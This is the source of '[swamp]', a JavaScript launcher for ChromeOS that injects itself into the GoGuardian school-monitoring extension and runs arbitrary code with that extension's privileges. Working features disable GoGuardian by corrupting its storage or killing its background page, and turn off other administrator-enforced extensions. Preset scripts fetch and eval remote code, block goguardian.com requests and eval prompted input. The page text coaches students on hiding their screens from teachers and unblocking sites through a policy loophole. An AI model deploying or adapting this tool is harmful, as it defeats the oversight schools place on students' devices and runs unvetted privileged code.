/*
Written by Bypassi on December 23rd, 2022
Minified file at /ga.js
*/
var swamp, chrome;
/*
 */
function _swamp() {
  swamp = {
    background: chrome.extension?.getBackgroundPage(),
    /*
     */
    elements: {
      create(elem, daddy) {
        var x = document.createElement(elem.tag);
        var str_parent = swamp.strings[daddy?.id] || swamp.strings;
        for (var attr in elem)
          x[attr] = attr.startsWith("on")
            ? swamp.functions[elem[attr]]
            : elem[attr];
        if (!elem.kids && str_parent.hasOwnProperty(x.id))
          x.innerHTML = str_parent[x.id];
        (daddy || document.body).appendChild(x);
        swamp.elements[elem.id] = x;
        elem.kids?.forEach((baby) => {
          swamp.elements.create(baby, x);
        });
      },
    },
    /*
     */
    functions: {
      save_code() {
        localStorage.swamp = swamp.elements.input.value;
      },
      insert_tab(event) {
        if (event.key === "Tab") {
          event.preventDefault();
          document.execCommand("insertText", false, "  ");
        }
      },
      log_replace(message) {
        swamp.elements.output.textContent += "\n\n" + message;
      },
      run_code() {
        swamp.functions.save_code();
        try {
          (this.background ? swamp.background : window).eval(
            swamp.elements.input.value
          );
          console.log("Code ran successfully");
        } catch (err) {
          console.log(err);
        }
      },
      reload_background() {
        swamp.background.location.reload();
        console.log("Scripts running as background were reloaded");
      },
      clone() {
        open("/manifest.json").onload = function () {
          this.eval(_swamp.toString() + "_swamp();var swamp");
          onbeforeunload = undefined;
          close();
        };
      },
      script_adding_loop(script) {
        var interesting_scripts_label = swamp.elements.create(
          { tag: "option", textContent: script.name, value: script.code },
          swamp.elements.select
        );
      },
      script_select() {
        swamp.elements.input.value = swamp.elements.select.value;
        swamp.elements.run_code.scrollIntoView();
      },
      disable_background_buttons() {
        swamp.elements.run_background.disabled = true;
        swamp.elements.reload_background.disabled = true;
      },
      hard_disable() {
        for (var i = 0; i < localStorage.length; i++)
          if (localStorage.key(i) !== "swamp")
            localStorage[localStorage.key(i)] = this.undo ? "" : "-";
        (swamp.background || window).location.reload();
      },
      soft_disable() {
        swamp.background.close();
        delete swamp.background;
        swamp.functions.disable_background_buttons();
      },
      undo_soft_disable() {
        if (confirm(swamp.strings.undo_prompt)) chrome.runtime.reload();
      },
      get_extensions() {
        chrome.management.getAll(function (extensions) {
          extensions.forEach(function (extension) {
            swamp.elements.create(
              {
                tag: "button",
                id: extension.id,
                textContent: extension.name,
                enabled: extension.enabled,
                admin: extension.installType === "admin",
                onclick: "toggle_extension",
              },
              swamp.elements.ltbeef_extensions
            );
            swamp.functions.strikethrough(
              swamp.elements[extension.id],
              extension.enabled
            );
            if (extension.id === chrome.runtime.id)
              swamp.elements[extension.id].className = "gg";
          });
        });
      },
      strikethrough(button, enabled) {
        button.style.textDecoration = enabled ? "none" : "line-through";
      },
      toggle_extension() {
        if (this.enabled && this.id === chrome.runtime.id)
          if (!confirm(swamp.strings.remove_gg_prompt)) return;
        this.enabled = !this.enabled;
        swamp.functions.strikethrough(this, this.enabled);
        chrome.management.setEnabled(this.id, this.enabled);
      },
      manage_all() {
        var admin_only = this.admin_only;
        var enabling = this.enabling;
        [...swamp.elements.ltbeef_extensions.children].forEach(function (
          button
        ) {
          if (
            (admin_only && !button.admin) ||
            !enabling === !button.enabled ||
            button.id === chrome.runtime.id
          )
            return;
          button.click();
        });
      },
    },
    /*
     */
    scripts: [
      { name: "Select an option...", code: `` },
      {
        name: "Display GoGuardian policy",
        code: `chrome.storage.local.get("policy", (json) => {
  console.log(JSON.stringify(json));
});`,
      },
      {
        name: "Run a third-party script",
        code: `fetch("https://example.com/example.js")
  .then((res) => res.text())
  .then(eval);`,
      },
      {
        name: "Emulate DNS and block all goguardian.com requests",
        code: `chrome.webRequest.onBeforeRequest.addListener(
  () => {
    return { redirectUrl: "javascript:" };
  },
  {
    urls: ["*://*.goguardian.com/*"],
  },
  ["blocking"]
);`,
      },
      {
        name: "Bookmarklet emulator when a Google tab is loaded",
        code: `chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.status == "complete") {
    chrome.tabs.executeScript(
      tabId, { code: \`
        if (location.hostname.endsWith("google.com")) {
          // Use your own code below:
          alert("Testing!");
        }
      \` }
    );
  }
});`,
      },
      {
        name: "Bookmarklet emulator on focused tab when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(() => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tab) => {
    chrome.tabs.executeScript(tab[0].id, {
      code: \`
        // Your own code below:
        alert("Testing!");
      \`,
      matchAboutBlank: true,
    });
  });
});`,
      },
      {
        name: "Toggle all other admin-forced extensions when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(function () {
  chrome.management.getAll((extensions) => {
    extensions.forEach((extension) => {
      if ("admin" === extension.installType && chrome.runtime.id !== extension.id)
        chrome.management.setEnabled(extension.id, !extension.enabled);
    });
  });
});`,
      },
      {
        name: "Display a goofy notification",
        code: `chrome.notifications.create(null, {
  type: "basic",
  iconUrl: "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",
  title: "Important GoGuardian Message",
  message: "We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist.",
});
// Credit to ilexite#8290`,
      },
      {
        name: "Run custom code when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(() => {
  eval(prompt("Code, please?"));
});
// Something like this could be useful for running in the background...`,
      },
      {
        name: "Toggle emulated DNS unblocker when the GoGuardian icon is clicked",
        code: `function block() {
  return { redirectUrl: "javascript:" };
}
var blocking = false;
function toggle() {
  if (blocking) {
    chrome.webRequest.onBeforeRequest.removeListener(block);
  } else {
    chrome.webRequest.onBeforeRequest.addListener(
      block,
      {
        urls: ["*://*.goguardian.com/*"],
      },
      ["blocking"]
    );
  }
  blocking = !blocking;
  alert("Emulated DNS unblocker is " + (blocking ? "on!" : "off!"));
}
toggle();
chrome.browserAction.onClicked.addListener(toggle);
// This is also mainly useful if you run it in the background`,
      },
    ],
    /*
     */
    strings: {
      style:
        "pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}h1,h2,h3,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;padding:10px 17px;border:none}button,input{background-color:#fff;padding:10px 20px;margin:0 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0 10px 10px 0;padding:8px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter 250ms}button[disabled]{pointer-events:none;filter:brightness(.5)}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}",
      title: "[swamp] Launcher for ChromeOS",
      subtitle:
        "Launcher made by Bypassi, inspired by Eli from TN, user interface made by Mr. PB, DNS hosted by The Greatest Giant",
      source_link:
        "<a href='https://yeo.drshacker.tech/swamp.js'>Source code</a>",
      run_code: {
        title: "Run your own code",
        description:
          'Put your script here to run it while pretending to be the GoGuardian extension. You will be able to access most "chrome" scripts and have other privileges such as access to all websites. Note that your code is saved automatically.',
        placeholder: "Input goes here...",
        output: "Output shows here:\n\n---",
        run: "Run on this page",
        reload: "Reload scripts on this page",
        run_background: "Run as background",
        reload_background: "Reload background scripts",
        button_description:
          'Concerning the buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, which makes it a pain to use [swamp] at places such as school where you can\'t set it up. But running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example). <b>If the background buttons above are disabled, that likely means that you need to click the "undo soft-disable" button later in this page.</b>',
      },
      interesting_scripts: {
        title: "Interesting scripts",
        description:
          "Some useful scripts for the textbox above. <b>DM Bypassi#7037 on Discord to suggest new ones (or general improvements to this launcher).</b>",
        policy_description:
          "By the way, if you find a URL like *google.com* in your GoGuardian whitelist policy, any url like https://blocked.com/?google.com will be unblocked for anyone in your district. Note that your policy may be inaccurate if you are using the hard-disable option or are signed into another Google account.",
        dns_description:
          "Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache. DNS unblocking may not work for blocking requests from other admin-installed extensions.",
        background_reminder:
          "And please read the thing about background running earlier in the page, because that could be useful for making some of these scripts run at school.",
      },
      disable_gg: {
        title: "Disable GoGuardian",
        hard_disable: "Hard-Disable GoGuardian",
        undo_hard_disable: "Undo Hard-Disable",
        hard_disable_description:
          "Hard-disable will disable GoGuardian and persist until you powerwash your device or undo it with the second button. If you want something less permanent, use the soft-disable option below or run a DNS emulator as background. Hard-disable works by messing with cookies that GoGuardian needs to run.",
        soft_disable: "Soft-Disable GoGuardian",
        undo_soft_disable: "Undo Soft-Disable",
        soft_disable_description:
          "Soft-disable only persists until Chrome is restarted (naturally or with chrome://restart). It is more of a full bypass than hard-disable, completely removing GoGuardian's background scripts. This, of course, means that you won't be able to run code as background while soft-disable is active. It also means that the process to undo the soft-disable will close this tab.",
        trouble_warning:
          '<b>Hard-disable will also prevent your teachers from seeing your screen, while soft-disable will not. Be careful not to get in trouble.</b> Also, the disable buttons don\'t have a super clear visual action. If you clicked them and "nothing happened", something probably happened. Try going to sites and check if GoGuardian blocks them (it should not).',
      },
      ltbeef: {
        title:
          'Disable other Chrome Extensions similarly to <a href="https://compactcow.com/ltbeef">LTBEEF</a>',
        manual_description:
          "LTBEEF was fixed by Chrome in v106, so this is a great alternative that works in the latest version. The buttons below will allow you to disable or enable all admin-enforced extensions.",
        broad_options_description:
          "Or you can try the more automatic broad options:",
        disable_all: "Disable all except GoGuardian",
        disable_all_admin: "Disable all admin-forced except GoGuardian",
        enable_all: "Re-enable all",
        soft_disable_recommendation:
          "Disabling GoGuardian with this process will close the [swamp] launcher. As an alternative, use the soft-disable button earlier on the page, which has the same functionality while allowing for the [swamp] editor to be used.",
      },
      remove_gg_prompt:
        "Are you sure you want to remove GoGuardian? It'll close the launcher until chrome://restart is visited. Soft-disable may be a better option if you want to keep using [swamp] with sites unblocked.",
      undo_prompt:
        'Undoing soft-disable will close the [swamp] launcher. Select "OK" to proceed.',
    },
  };
  /*
   */
  document.body.innerHTML = "";
  /*
   */
  [
    { tag: "title", id: "title" },
    {
      tag: "style",
      id: "style",
    },
    { tag: "base", target: "_blank" },
    {
      tag: "h1",
      id: "title",
    },
    {
      tag: "h3",
      id: "subtitle",
    },
    {
      tag: "p",
      id: "source_link",
    },
    { tag: "hr" },
    {
      tag: "div",
      id: "run_code",
      kids: [
        {
          tag: "h2",
          id: "title",
        },
        { tag: "p", id: "description" },
        {
          tag: "textarea",
          id: "input",
          placeholder: swamp.strings.run_code.placeholder,
          onkeyup: "save_code",
          onkeydown: "insert_tab",
        },
        {
          tag: "pre",
          id: "output",
        },
        {
          tag: "button",
          id: "run",
          onclick: "run_code",
        },
        {
          tag: "button",
          id: "reload",
          onclick: "clone",
        },
        { tag: "br" },
        {
          tag: "button",
          id: "run_background",
          background: true,
          onclick: "run_code",
        },
        {
          tag: "button",
          id: "reload_background",
          onclick: "reload_background",
        },
        { tag: "p", id: "button_description" },
      ],
    },
    { tag: "hr" },
    {
      tag: "div",
      id: "interesting_scripts",
      kids: [
        { tag: "h2", id: "title" },
        { tag: "p", id: "description" },
        {
          tag: "select",
          id: "select",
          onchange: "script_select",
        },
        { tag: "p", id: "policy_description" },
        { tag: "p", id: "dns_description" },
        { tag: "p", id: "background_reminder" },
      ],
    },
    { tag: "hr" },
    {
      tag: "div",
      id: "disable_gg",
      kids: [
        { tag: "h2", id: "title" },
        { tag: "button", id: "hard_disable", onclick: "hard_disable" },
        {
          tag: "button",
          id: "undo_hard_disable",
          undo: true,
          onclick: "hard_disable",
        },
        { tag: "p", id: "hard_disable_description" },
        { tag: "button", id: "soft_disable", onclick: "soft_disable" },
        {
          tag: "button",
          id: "undo_soft_disable",
          onclick: "undo_soft_disable",
        },
        { tag: "p", id: "soft_disable_description" },
        { tag: "p", id: "trouble_warning" },
      ],
    },
    { tag: "hr" },
    {
      tag: "div",
      id: "ltbeef",
      kids: [
        { tag: "h2", id: "title" },
        { tag: "p", id: "manual_description" },
        { tag: "div", id: "ltbeef_extensions" },
        { tag: "p", id: "broad_options_description" },
        { tag: "button", id: "disable_all", onclick: "manage_all" },
        {
          tag: "button",
          id: "disable_all_admin",
          admin_only: true,
          onclick: "manage_all",
        },
        {
          tag: "button",
          id: "enable_all",
          enabling: true,
          onclick: "manage_all",
        },
        { tag: "p", id: "soft_disable_recommendation" },
      ],
    },
  ].forEach((elem) => {
    swamp.elements.create(elem);
  });
  /*
   */
  history.replaceState({}, {}, "/swamp");
  onbeforeunload = () => true;
  console.log = swamp.functions.log_replace;
  if (swamp.background)
    swamp.background.console.log = swamp.functions.log_replace;
  else swamp.functions.disable_background_buttons();
  swamp.scripts.forEach(swamp.functions.script_adding_loop);
  swamp.functions.get_extensions();
  swamp.elements.input.value = localStorage.swamp || "";
}
/*
 */
if (window !== chrome.extension?.getBackgroundPage())
  open("/manifest.json").onload = function () {
    this.eval(_swamp.toString() + "_swamp();var swamp");
    top.close();
  };